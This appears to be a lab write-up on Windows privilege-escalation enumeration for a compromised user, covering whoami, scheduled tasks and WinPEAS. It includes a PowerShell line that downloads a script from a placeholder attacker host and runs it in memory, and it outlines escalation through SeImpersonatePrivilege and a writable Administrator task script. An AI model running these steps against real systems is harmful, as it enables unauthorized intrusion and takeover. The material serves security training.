# 15 - Window System Enumeration


## 1. Initial User Context Enumeration

The first step is to understand the permissions and context of our compromised user, `john`.

### a) Checking Privileges (`whoami /priv`)
*   **Command:** `whoami /priv`
*   **Key Finding:** The user `john` has the `SeImpersonatePrivilege` enabled.
*   **Security Relevance:** This is a **highly significant privilege**. While intended for services to impersonate clients, it can be abused by a number of well-known exploits (e.g., "Juicy Potato," "PrintSpoofer") to escalate privileges to `NT AUTHORITY\SYSTEM`. This is a primary avenue for privilege escalation.

### b) Checking Group Memberships (`whoami /groups`)
*   **Command:** `whoami /groups`
*   **Key Finding:** `john` is a member of standard groups like `Users` and `Remote Desktop Users`, but also `Event Log Readers`.
*   **Security Relevance:** Membership in `Remote Desktop Users` confirms why our RDP login was successful. Membership in `Event Log Readers` could allow us to read security logs that might contain sensitive information.

---

## 2. System and Task Enumeration

Next, we investigate the system's configuration and scheduled tasks.

### a) System Information
*   Commands like `systeminfo` and `wmic qfe` fail due to `john` being a standard user. This confirms we do not have administrative privileges yet.

### b) Scheduled Tasks (`schtasks`)
*   **Command:** `schtasks /query /fo LIST /v`
*   **Critical Finding:** A custom scheduled task named **`CorpBackupAgent`** is discovered.
    *   **Task to Run:** It executes a PowerShell script: `C:\ProgramData\CorpBackup\Scripts\backupprep.ps1`.
    *   **Run As User:** The task is configured to run with the privileges of the **`Administrator`** user.
*   **Security Relevance:** This is a major potential vulnerability. If we can modify the `backupprep.ps1` script, our malicious code will be executed with `Administrator` privileges the next time the task runs.

---

## 3. Automated Enumeration with `WinPEAS`

To speed up the enumeration process, we can use an automated script like **WinPEAS**.

1.  **Transfer the Script:** Download `winPEAS.ps1` to our attacker machine, host it with a simple Python web server, and then use PowerShell on the target to download and execute it in memory, saving the output to a file.
    ```powershell
    # On attacker machine
    wget <winpeas_url>
    python3 -m http.server 8080

    # On target machine
    powershell "IEX(New-Object Net.WebClient).downloadString('http://<attacker_ip>:8080/winPEAS.ps1')" > winpeas.txt
    ```
2.  **Analyze the Output:** The WinPEAS output confirms and expands upon our manual findings.

### Key Findings from WinPEAS
*   **Writable `C:\ProgramData`:** WinPEAS confirms that the `BUILTIN\Users` group has **write permissions** on the `C:\ProgramData` directory.
    *   **Security Relevance:** This is a significant misconfiguration. Since the `CorpBackupAgent` scheduled task runs a script from within this directory (`C:\ProgramData\CorpBackup\Scripts\backupprep.ps1`), and we (as a member of `Users`) can write to this directory, we likely have the ability to modify or replace the script.
*   **System Information:** Provides a detailed summary of the OS (Windows Server 2019), installed hotfixes, network configuration, and confirms the `HTBLAB` workgroup.
*   **Listening Ports:** Confirms the services we found with `nmap` are listening on `0.0.0.0`, meaning they are accessible from all network interfaces.

---

## 4. Summary of Actionable Findings

Our internal enumeration has revealed two very strong potential paths for privilege escalation.

| Finding | Description | Security Impact |
| :--- | :--- | :--- |
| **`SeImpersonatePrivilege`** | The user `john` has the "Impersonate a client after authentication" privilege enabled. | **Critical.** This privilege is abusable by well-known exploits to escalate to `NT AUTHORITY\SYSTEM`. |
| **Writable Scheduled Task Script** | A scheduled task, `CorpBackupAgent`, runs as `Administrator` and executes a script (`backupprep.ps1`) located in a subdirectory of `C:\ProgramData`. The `C:\ProgramData` directory is writable by all users. | **Critical.** This is a direct privilege escalation vector. We can likely modify or replace `backupprep.ps1` with a malicious payload (e.g., a reverse shell). When the task runs (every 2 minutes, according to the schedule), our payload will execute as `Administrator`. |

**Conclusion:** We have moved from initial access to identifying two clear, high-confidence methods to gain full administrative control over the Windows target. The next step is to exploit one of these findings.
